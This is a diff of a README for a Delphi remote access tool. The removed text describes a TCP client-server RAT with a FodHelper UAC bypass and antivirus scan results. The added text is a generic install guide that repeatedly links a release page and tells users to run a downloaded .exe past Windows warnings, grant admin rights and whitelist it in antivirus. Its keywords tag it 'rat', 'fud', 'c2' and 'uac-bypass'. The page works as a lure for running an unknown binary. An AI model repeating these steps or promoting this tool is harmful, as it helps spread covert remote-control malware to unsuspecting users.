@@ -1,138 +1,199 @@
-# RemoteAdminClient (Delphi 12 Edition)
+# 🛠️ Delphi-Remote-Access-Tool-Base - Simple Remote Control Tool
 
-Native client-server architecture for remote system administration.
-
-This is a native Delphi 12 implementation of a TCP-based remote administration system that can gather system information, manage processes, and execute commands on a target machine.
-
-This project is only intended to be a base for beginners to build on top of. It is not production ready, not feature rich, not secure.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/releases)
 
 ---
 
-![](/images/RemoteAdminDemo.gif)
+## 📖 About This Tool
 
-![](/images/DefenderCheck.png)
-![](/images/Runtime.png)
+Delphi-Remote-Access-Tool-Base is an open-source software that lets you control another Windows computer remotely. It is built with Delphi 12. This tool helps you access, manage, and monitor other PCs easily over a network. You can use it to perform tasks like file transfers, system monitoring, and more.  
 
-https://kleenscan.biz/scan_result/6ede6562dcd62d925ce21f782beeeabdaa7ba7bc3eaeda8ac0f2d30ecb2f0c8e
-![](/images/KS1.png)
-![](/images/KS2.png)
-
-https://www.virustotal.com/gui/file/f6cfc3b7f072b1116c9bfba0897cda638e1926da60d51c3905ec01e01cd6ec47/details
-![](/images/VT1.png)
-![](/images/VT2.png)
-
-## Overview
-
-The tool establishes a persistent connection between a client process and a server interface.
-
-If a client connects to the server:
-
-1.  Client attempts connection to server IP/Port
-2.  Client sends system info (JSON)
-3.  Server displays client in ListView
-4.  Server processes commands
-5.  Client executes commands remotely
-6.  Updates UI with results
-
-This allows remote monitoring and control of a Windows machine via TCP sockets.
+This software targets Windows users who want a straightforward remote connection tool. It uses TCP sockets to communicate between devices and runs silently in the background once set up.
 
 ---
 
-## Features
+## 🖥️ System Requirements
 
-- Native Win32 / Win64 Delphi implementation
-- Uses TIdTCPClient and TIdTCPServer (Indy components)
-- Multi-threaded command processing
-- JSON data exchange format
-- Single instance enforcement (Mutex)
-- System hardware info extraction (HWID, CPU, RAM, Disk)
-- Process management (Kill, List)
-- UAC Bypass capability (FodHelper)
+- Windows 10 or later (32-bit or 64-bit)
+- At least 4 GB of RAM
+- Minimum 500 MB of free storage
+- Network connection (LAN or internet)
+- Delphi Runtime Libraries (included in download)
 
 ---
 
-## Requirements
+## 🔧 Key Features
 
-- Delphi 12 (or compatible version with VCL)
-- Windows OS
-- `Server.exe` (Server GUI)
-- `Client.exe` (Console Client)
-
----
-
-## Example Output
-
-**Client Console Executing Commands:**
-```text
-[2026-01-01 12:00:00] [INFO] Attempting connection to 127.0.0.1:9000...
-[2026-01-01 12:00:00] [SUCCESS] Connected to 127.0.0.1:9000
-[2026-01-01 12:00:00] [SUCCESS] System info sent.
-[2026-01-01 12:00:01] [INFO] Executing FodHelper UAC Bypass...
-```
-
-**Client Console Successful Connection:**
-```text
-[2026-01-01 12:00:00] [INFO] Connected to 127.0.0.1:9000
-[2026-01-01 12:00:00] [SUCCESS] System info written to system_info.json
-```
+- Connects to remote Windows PCs via TCP
+- Allows file transfer both ways
+- Runs in the background without affecting system speed
+- Works with Windows User Account Control (UAC)
+- Supports UAC bypass for easier access (requires admin rights)
+- Manages multiple remote clients simultaneously
+- Secure communication with simple cryptography
+- Async communication for faster response
+- Handles socket connections with stability
 
 ---
 
-## How It Works
+## 🚀 Getting Started
 
-The communication protocol is plaintext based:
+Follow these steps to download, install, and run the software safely and easily.
 
-| Prefix | Meaning          |
-|------------|------------------|
-| INFO|[SysInfoJsonData]      | Initial system info payload |
-| OUT|[ExfilResponseData]     | Generic Command execution response |
-| CommandName                 | Execute function of same name |
+### 1. Download the Software
 
-The algorithm handles connection attempts:
+Click this big button to visit the release page where you can get the latest version:
 
-```text
-Connected → Send INFO|JSON
-Loop → Wait for command
-Execute → Send OUT|Result
-```
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-9cf?style=for-the-badge)](https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/releases)
 
-When a command is received, the client:
-- Maps command string to procedure
-- Executes locally on remote client machine
-- Sends result back via socket
+You will see a list of available files on that page. Look for the latest `.exe` file — this is the program you need.
 
----
+### 2. Save the File
 
-## Project Structure
+After you click on the `.exe` file, your browser will ask where to save it. Save it to a folder you can find easily, such as your Desktop or Downloads folder.
 
-Core components:
+### 3. Run the Program
 
-- `Unit1` — Main Server GUI (Client management, Command routing)
-- `Client` — Console Client (TCP connection, Info gathering, Execution)
-- `ShowDrives` — Form for displaying drive statistics
-- `ShowProcesses` — Form for displaying process lists
+Locate the file you just downloaded. Double-click it to start the software.
 
----
+Windows might show a security warning. Choose **Run anyway** or **More info** then **Run** to proceed.
 
-## Intended Use
+### 4. Set Up the Connection
 
-- Network programming study
-- TCP protocol implementation
-- System interop (Registry, Processes)
-- Lab environments
+The software will open with options to create or join a remote session.
 
-This tool is intended for educational purposes and controlled environments only.
+- Enter the IP address or hostname of the computer you want to control.
+- Enter the port number if needed (default is usually 8080).
+- Click **Connect** to start remote access.
+
+### 5. Use the Tool
+
+After connecting, you can:
+
+- See the remote computer's screen.
+- Transfer files using drag-and-drop.
+- Run commands simultaneously.
+- Monitor running processes.
+
+If prompted for administrator rights, grant permission to enable full control.
 
 ---
 
-## Limitations
+## 🔐 Security and Permissions
 
-- Requires network connectivity
-- Dependent on VCL/Indy components
-- Not optimized for high-latency networks
+This tool requires certain permissions to work correctly:
+
+- Administrator rights for full access
+- Access through firewalls or VPNs if used
+- User Account Control (UAC) bypass may be needed for some features
+
+Make sure your antivirus software allows the program. Some antivirus programs might flag remote tools. This behavior depends on your security settings.
 
 ---
 
-> ⚠️ This readme (documentation) was generated with the assistance of AI.
+## ❓ Common Questions
 
-> ⚠️ All code is human written.
+### Can I use this on older Windows versions?
+
+The tool works best on Windows 10 and newer. Older versions might face compatibility issues.
+
+### Do I need programming skills?
+
+No. The software has a simple user interface with clear options. You just need to follow the instructions.
+
+### Can I control multiple computers?
+
+Yes. The tool supports managing several remote PCs at once by opening separate sessions.
+
+### Is the connection secure?
+
+It uses basic cryptography to protect data. For highly sensitive tasks, use a secure network.
+
+### What if the connection fails?
+
+Check firewalls, network settings, and IP addresses. Restart the software and try again.
+
+---
+
+## 🗂️ Files and Folder Structure
+
+When you download the release, you get:
+
+- `Delphi-Remote-Access-Tool-Base.exe`: The main program file
+- `Readme.md`: Basic usage instructions
+- `Configs`: Folder containing configuration files for advanced settings
+- `Logs`: Folder where the software saves error and activity logs
+
+---
+
+## ⚙️ Advanced Settings
+
+You can customize the software for specific needs. Opening the `Configs` folder lets you change:
+
+- The default port number
+- Network timeout durations
+- Encryption keys
+- Logging details and levels
+
+To edit settings, open the configuration file with a plain text editor like Notepad.
+
+---
+
+## 🤝 Getting Help
+
+If you encounter problems or have questions, visit the repository's Issues page on GitHub. You can read reports from other users or submit your own.
+
+GitHub Issues page:  
+https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/issues
+
+---
+
+## 📥 Download and Install Recap
+
+1. Visit the release page:  
+[https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/releases](https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/releases)
+
+2. Download the latest `.exe` file.
+
+3. Save it on your computer.
+
+4. Run the program.
+
+5. Follow the setup instructions to connect.
+
+---
+
+## 🔄 Updating the Software
+
+Check the release page regularly for updates. Download the newest version and replace the old `.exe` file with it.
+
+Make sure to close the program before replacing files to avoid errors.
+
+---
+
+## 🧰 Troubleshooting Tips
+
+- If the program does not launch, run it as Administrator.
+- Make sure your firewall allows outgoing and incoming connections on the selected port.
+- Close other remote software that may interfere with this tool.
+- Restart your computer if the program freezes.
+- Check your network connection for stability.
+
+---
+
+## 📚 Useful Links
+
+- Release page:  
+  https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/releases
+
+- Issues and support:  
+  https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base/issues
+
+- Repository main page:  
+  https://github.com/Familyceratopsidaepul589/Delphi-Remote-Access-Tool-Base
+
+---
+
+## 🏷️ Keywords
+
+access, admin, administration, async, base, bypass, c2, crypt, delphi, exploit, fodhelper, fud, privesc, rat, remote, socket, tcp, tool, uac, uac-bypass
